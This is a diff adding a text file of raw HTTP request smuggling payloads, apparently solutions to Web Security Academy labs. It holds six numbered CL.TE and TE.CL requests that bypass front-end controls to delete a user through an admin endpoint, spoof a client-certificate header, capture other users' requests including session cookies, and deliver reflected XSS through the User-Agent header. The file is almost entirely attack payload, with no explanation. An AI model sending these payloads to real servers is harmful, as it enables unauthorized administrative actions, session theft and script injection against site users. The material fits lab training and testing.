@@ -1,0 +1,118 @@
+1- Bypass front-end security controls, CL.TE vulnerability:
+
+POST / HTTP/1.1
+Host: 0a7e000b04dcb4ce80a8e4d200ff00e2.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+==================================================================================================
+2- Bypass front-end security controls, TE.CL vulnerability:
+
+POST / HTTP/1.1
+Host: 0aae00a50485738d82b7108b004c0030.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+88
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+==================================================================================================
+3- Exploiting HTTP request smuggling to reveal front-end request rewriting:
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+------------------------------------------------------------------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+==================================================================================================
+4-Bypassing client authentication:
+
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: x-www-form-urlencoded
+Content-Length: 64
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-SSL-CLIENT-CN: administrator
+Foo: x
+==================================================================================================
+5- Exploiting HTTP request smuggling to capture other users' requests:
+
+POST / HTTP/1.1
+Host: 0adf004e03f4eb6b81ebc07300910084.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 347
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0adf004e03f4eb6b81ebc07300910084.web-security-academy.net
+Cookie: session=O4DXvlqZZ9ObuRFpbtsDH5cNjea5a9Hs
+Content-Length: 950
+Content-Type: application/x-www-form-urlencoded
+
+csrf=h6dePdw0pFbzGZuupPhbCdK1415OuXrM&postId=2&name=Ahmad&email=test%40test.com&website=http%3A%2F%2Fwww.google.com&comment=Syria
+=======================================================================================================================================================================
+6- Exploiting HTTP request smuggling to deliver reflected XSS:
+
+
+POST / HTTP/1.1
+Host: 0af2005803571166805103aa00e9005e.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 153
+
+0
+
+GET /post?postId=3 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+User-Agent: Hacker"/><script>alert(1)</script>
+
+x=
+=======================================================================================================================================================================
+
